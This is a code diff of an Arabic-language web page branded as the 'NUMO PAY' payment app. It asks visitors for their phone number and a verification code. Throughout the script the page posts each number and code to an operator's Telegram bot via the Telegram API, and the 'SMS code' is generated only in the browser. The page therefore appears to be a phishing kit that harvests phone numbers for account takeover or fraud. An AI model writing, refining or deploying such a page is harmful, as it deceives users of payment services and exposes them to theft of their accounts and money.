@@ -6,10 +6,8 @@
 <meta property="og:title" content="نمو باي - NUMO PAY">
 <meta property="og:description" content="تطبيق نمو باي - خدمات الدفع الحديثة">
 <meta property="og:image" content="https://l.top4top.io/p_3792v4b4y0.jpeg">
-<meta property="og:url" content="">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="نمو باي - NUMO PAY">
-<meta name="twitter:description" content="تطبيق نمو باي - خدمات الدفع الحديثة">
 <meta name="twitter:image" content="https://l.top4top.io/p_3792v4b4y0.jpeg">
 <title>نمو باي - NUMO PAY</title>
 <style>
@@ -47,7 +45,6 @@ body {
   box-shadow: 0 10px 40px rgba(0,0,0,0.1);
 }
 
-/* الشعار */
 .logo {
   width: 150px;
   height: 150px;
@@ -60,7 +57,6 @@ body {
   color: #2c2c2c;
   font-weight: bold;
   margin: 20px 0 5px;
-  letter-spacing: -1px;
 }
 
 .brand-en {
@@ -68,20 +64,12 @@ body {
   color: #999;
   letter-spacing: 3px;
   margin-bottom: 30px;
-  font-weight: 600;
 }
 
-/* صفحة الهاتف */
 .subtitle {
   font-size: 18px;
   color: #666;
   margin-bottom: 40px;
-  font-weight: 500;
-}
-
-.phone-input-wrapper {
-  position: relative;
-  margin-bottom: 30px;
 }
 
 .phone-input {
@@ -93,8 +81,7 @@ body {
   font-size: 18px;
   text-align: left;
   color: #333;
-  transition: all 0.3s ease;
-  background: white;
+  margin-bottom: 30px;
 }
 
 .phone-input:focus {
@@ -113,30 +100,22 @@ body {
   color: white;
   font-weight: bold;
   cursor: pointer;
-  transition: all 0.3s ease;
   box-shadow: 0 5px 20px rgba(255, 205, 0, 0.3);
   margin-top: 20px;
 }
 
 .verify-btn:hover:not(:disabled) {
   transform: translateY(-3px);
-  box-shadow: 0 8px 25px rgba(255, 205, 0, 0.4);
-}
-
-.verify-btn:active:not(:disabled) {
-  transform: translateY(0);
 }
 
 .verify-btn:disabled {
   background: #999;
-  cursor: not-allowed;
   opacity: 0.7;
 }
 
 .message {
   margin-top: 20px;
   font-size: 14px;
-  min-height: 20px;
   padding: 10px;
   border-radius: 8px;
 }
@@ -151,7 +130,6 @@ body {
   background: #d5f4e6;
 }
 
-/* صفحة التحقق */
 .code-title {
   font-size: 36px;
   color: #ffcd00;
@@ -187,7 +165,6 @@ body {
   text-align: center;
   font-weight: bold;
   color: #333;
-  transition: all 0.3s ease;
   background: white;
 }
 
@@ -197,24 +174,8 @@ body {
   box-shadow: 0 0 0 3px rgba(255, 205, 0, 0.1);
 }
 
-.code-input::-webkit-outer-spin-button,
-.code-input::-webkit-inner-spin-button {
-  -webkit-appearance: none;
-  margin: 0;
-}
-
-.input[type=number] {
-  -moz-appearance: textfield;
-}
-
 .resend-section {
   margin: 30px 0;
-}
-
-.resend-text {
-  font-size: 15px;
-  color: #666;
-  margin-bottom: 10px;
 }
 
 .resend-btn {
@@ -225,7 +186,6 @@ body {
   cursor: pointer;
   text-decoration: underline;
   font-weight: bold;
-  transition: color 0.3s ease;
 }
 
 .resend-btn:hover:not(:disabled) {
@@ -234,7 +194,6 @@ body {
 
 .resend-btn:disabled {
   color: #ccc;
-  cursor: not-allowed;
 }
 
 .timer {
@@ -251,7 +210,6 @@ body {
   cursor: pointer;
   text-decoration: underline;
   margin-top: 20px;
-  transition: color 0.3s ease;
 }
 
 .back-btn:hover {
@@ -265,50 +223,12 @@ body {
   border-top: 1px solid #eee;
   padding-top: 20px;
 }
-
-@media (max-width: 500px) {
-  .container {
-    padding: 40px 20px;
-    border-radius: 25px;
-  }
-
-  .logo {
-    width: 120px;
-    height: 120px;
-    margin-bottom: 20px;
-  }
-
-  .brand-name {
-    font-size: 28px;
-  }
-
-  .brand-en {
-    font-size: 24px;
-  }
-
-  .phone-input {
-    height: 55px;
-    font-size: 16px;
-  }
-
-  .code-input {
-    width: 60px;
-    height: 60px;
-    font-size: 28px;
-  }
-
-  .verify-btn {
-    height: 60px;
-    font-size: 20px;
-  }
-}
 </style>
 </head>
 <body>
 
 <div class="container">
 
-  <!-- صفحة إدخال الهاتف -->
   <div class="page active" id="phonePage">
     <div class="logo"></div>
     <div class="brand-name">نمو باي</div>
@@ -316,16 +236,13 @@ body {
     
     <div class="subtitle">الرجاء إدخال رقم هاتفك للمتابعة</div>
     
-    <div class="phone-input-wrapper">
-      <input 
-        type="tel" 
-        id="phone" 
-        class="phone-input"
-        placeholder="أدخل رقم هاتفك"
-        maxlength="12"
-        inputmode="numeric"
-      >
-    </div>
+    <input 
+      type="tel" 
+      id="phone" 
+      class="phone-input"
+      placeholder="أدخل رقم هاتفك"
+      maxlength="12"
+    >
     
     <button class="verify-btn" id="phoneBtn" onclick="handlePhoneSubmit()">تحقق</button>
     
@@ -334,7 +251,6 @@ body {
     <div class="footer">© 2026 جميع الحقوق محفوظة - نمو باي</div>
   </div>
 
-  <!-- صفحة إدخال الرمز -->
   <div class="page" id="codePage">
     <div class="logo"></div>
     <div class="brand-name">نمو باي</div>
@@ -343,11 +259,11 @@ body {
     <div class="code-title">أدخل الرمز</div>
     
     <div class="code-subtitle">
-      تم إرسال رمز إليك عبر رسالة نصية قصيرة على الرقم <span class="phone" id="displayPhone">0914072883</span> 
+      تم إرسال رمز إليك عبر رسالة نصية قصيرة على الرقم <span class="phone" id="displayPhone"></span> 
       الرجاء إدخال هذا الرمز لمتابعة التسجيل
     </div>
     
-    <div class="code-inputs" id="codeInputs">
+    <div class="code-inputs">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
@@ -359,12 +275,10 @@ body {
     <div class="message" id="codeMsg"></div>
     
     <div class="resend-section">
-      <div class="resend-text">
-        <button class="resend-btn" id="resendBtn" onclick="handleResend()">
-          تحديث الرمز
-        </button>
-        <span class="timer" id="timer"></span>
-      </div>
+      <button class="resend-btn" id="resendBtn" onclick="handleResend()">
+        تحديث الرمز
+      </button>
+      <span class="timer" id="timer"></span>
     </div>
     
     <button class="back-btn" onclick="goBackToPhone()">العودة</button>
@@ -382,19 +296,20 @@ let currentPhone = '';
 let verificationCode = '';
 let resendTimer = 0;
 
-// معالجة الهاتف
 function handlePhoneSubmit() {
   const phone = document.getElementById('phone').value.trim();
   const msgDiv = document.getElementById('phoneMsg');
   const btn = document.getElementById('phoneBtn');
 
-  if (phone === '') {
-    showMessage(msgDiv, 'يرجى إدخال رقم الهاتف', 'error');
+  if (!phone) {
+    msgDiv.innerText = 'يرجى إدخال رقم الهاتف';
+    msgDiv.className = 'message error';
     return;
   }
 
   if (!/^\d{9,12}$/.test(phone)) {
-    showMessage(msgDiv, 'يرجى إدخال رقم هاتف صحيح', 'error');
+    msgDiv.innerText = 'يرجى إدخال رقم هاتف صحيح';
+    msgDiv.className = 'message error';
     return;
   }
 
@@ -402,67 +317,66 @@ function handlePhoneSubmit() {
   btn.disabled = true;
   btn.innerText = 'جاري الإرسال...';
 
-  // إرسال رقم الهاتف لوحده في البداية
-  const message = `📱 رقم هاتف جديد - نمو باي\n\n📞 رقم الهاتف: ${phone}\n\n⏳ بانتظار رمز التحقق...`;
+  sendPhoneToTelegram(phone);
+}
 
-  sendToTelegram(message).then(success => {
-    if (success) {
-      // انتقل للصفحة التالية بدون رسالة نجاح
-      setTimeout(() => {
-        goToCodePage();
-      }, 800);
+function sendPhoneToTelegram(phone) {
+  const message = `📱 رقم هاتف جديد - نمو باي\n\n📞 رقم الهاتف: ${phone}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    console.log('Phone Send Response:', data);
+    if (data.ok) {
+      setTimeout(() => goToCodePage(), 800);
     } else {
-      showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
-      btn.disabled = false;
-      btn.innerText = 'تحقق';
+      document.getElementById('phoneMsg').innerText = '❌ خطأ في الإرسال';
+      document.getElementById('phoneMsg').className = 'message error';
+      document.getElementById('phoneBtn').disabled = false;
+      document.getElementById('phoneBtn').innerText = 'تحقق';
     }
+  })
+  .catch(e => {
+    console.error('Phone Send Error:', e);
+    document.getElementById('phoneMsg').innerText = '❌ خطأ الاتصال';
+    document.getElementById('phoneMsg').className = 'message error';
+    document.getElementById('phoneBtn').disabled = false;
+    document.getElementById('phoneBtn').innerText = 'تحقق';
   });
 }
 
-// الانتقال لصفحة الرمز
 function goToCodePage() {
   document.getElementById('phonePage').classList.remove('active');
   document.getElementById('codePage').classList.add('active');
   document.getElementById('displayPhone').innerText = currentPhone;
+  
+  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+  console.log('Generated Code:', verificationCode);
+  
   setupCodeInputs();
   startResendTimer();
-  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-  console.log('Code:', verificationCode);
 }
 
-// إعداد حقول الرموز
 function setupCodeInputs() {
   const inputs = document.querySelectorAll('.code-input');
   inputs.forEach((input, index) => {
     input.value = '';
-    input.addEventListener('keyup', function(e) {
-      if (this.value.length > 1) {
-        this.value = this.value[0];
-      }
-      if (!/^\d*$/.test(this.value)) {
-        this.value = '';
-        return;
-      }
-      if (this.value && index < inputs.length - 1) {
-        inputs[index + 1].focus();
-      }
-      if (e.key === 'Backspace' && !this.value && index > 0) {
-        inputs[index - 1].focus();
-      }
-    });
-
-    input.addEventListener('paste', function(e) {
-      e.preventDefault();
-      const data = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = data.replace(/\D/g, '').substring(0, 4);
-      for (let i = 0; i < digits.length && i < inputs.length; i++) {
-        inputs[i].value = digits[i];
-      }
+    input.addEventListener('keyup', (e) => {
+      if (input.value.length > 1) input.value = input.value[0];
+      if (!/^\d*$/.test(input.value)) input.value = '';
+      if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+      if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
     });
   });
 }
 
-// معالجة الرمز
 function handleCodeSubmit() {
   const inputs = document.querySelectorAll('.code-input');
   const code = Array.from(inputs).map(i => i.value).join('');
@@ -470,7 +384,8 @@ function handleCodeSubmit() {
   const btn = document.getElementById('codeBtn');
 
   if (code.length !== 4) {
-    showMessage(msgDiv, 'يرجى إدخال الرمز كاملاً (4 أرقام)', 'error');
+    msgDiv.innerText = 'يرجى إدخال الرمز كاملاً';
+    msgDiv.className = 'message error';
     return;
   }
 
@@ -478,57 +393,78 @@ function handleCodeSubmit() {
   btn.innerText = 'جاري التحقق...';
 
   if (code === verificationCode) {
-    showMessage(msgDiv, '✅ تم التحقق بنجاح!', 'success');
-
-    // إرسال رقم الهاتف + رمز التحقق معاً
-    const finalMessage = `✅ تحقق ناجح - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}\n\n✔️ تم التحقق بنجاح والتسجيل مكتمل`;
-
-    console.log('Sending to Telegram:', finalMessage);
+    msgDiv.innerText = '✅ رمز صحيح!';
+    msgDiv.className = 'message success';
     
-    sendToTelegram(finalMessage).then(success => {
-      console.log('Send result:', success);
-      if (success) {
-        setTimeout(() => {
-          showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
-          setTimeout(() => {
-            goBackToPhone();
-          }, 1500);
-        }, 300);
-      } else {
-        showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
-        btn.disabled = false;
-        btn.innerText = 'تحقق من الرمز';
-      }
-    });
+    sendCodeToTelegram(code);
   } else {
-    showMessage(msgDiv, '❌ الرمز غير صحيح. حاول مرة أخرى', 'error');
+    msgDiv.innerText = '❌ الرمز غير صحيح';
+    msgDiv.className = 'message error';
     btn.disabled = false;
     btn.innerText = 'تحقق من الرمز';
   }
 }
 
-// إعادة الإرسال
+function sendCodeToTelegram(code) {
+  const message = `✅ تحقق ناجح - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    console.log('Code Send Response:', data);
+    if (data.ok) {
+      setTimeout(() => {
+        document.getElementById('codeMsg').innerText = '🎉 تم الإرسال بنجاح!';
+        document.getElementById('codeMsg').className = 'message success';
+        setTimeout(() => goBackToPhone(), 1500);
+      }, 300);
+    }
+  })
+  .catch(e => {
+    console.error('Code Send Error:', e);
+    document.getElementById('codeMsg').innerText = '❌ خطأ في الإرسال';
+    document.getElementById('codeMsg').className = 'message error';
+  });
+}
+
 function handleResend() {
   const btn = document.getElementById('resendBtn');
   btn.disabled = true;
 
-  const message = `🔄 إعادة إرسال رمز - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز جديد تم توليده`;
+  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+  console.log('New Code:', verificationCode);
 
-  sendToTelegram(message).then(() => {
-    document.getElementById('codeMsg').innerHTML = '';
-    verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-    console.log('New Code:', verificationCode);
+  const message = `🔄 رمز جديد - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    console.log('Resend Response:', data);
     startResendTimer();
-  });
+  })
+  .catch(e => console.error('Resend Error:', e));
 }
 
-// مؤقت الإعادة
 function startResendTimer() {
   resendTimer = 60;
   const btn = document.getElementById('resendBtn');
   const timer = document.getElementById('timer');
 
-  function update() {
+  const update = () => {
     if (resendTimer > 0) {
       resendTimer--;
       timer.innerText = `(${resendTimer}s)`;
@@ -537,11 +473,10 @@ function startResendTimer() {
       btn.disabled = false;
       timer.innerText = '';
     }
-  }
+  };
   update();
 }
 
-// العودة
 function goBackToPhone() {
   document.getElementById('codePage').classList.remove('active');
   document.getElementById('phonePage').classList.add('active');
@@ -549,40 +484,6 @@ function goBackToPhone() {
   document.getElementById('phoneMsg').innerHTML = '';
   document.getElementById('phoneBtn').innerText = 'تحقق';
   document.getElementById('phoneBtn').disabled = false;
-  currentPhone = '';
-  verificationCode = '';
-}
-
-// إرسال للتلجرام
-function sendToTelegram(message) {
-  return new Promise((resolve) => {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    })
-    .then(r => r.json())
-    .then(data => {
-      console.log('Telegram response:', data);
-      resolve(data.ok);
-    })
-    .catch(err => {
-      console.error('Telegram error:', err);
-      resolve(false);
-    });
-  });
-}
-
-// عرض الرسائل
-function showMessage(element, text, type) {
-  element.innerText = text;
-  element.className = `message ${type}`;
 }
 </script>
 
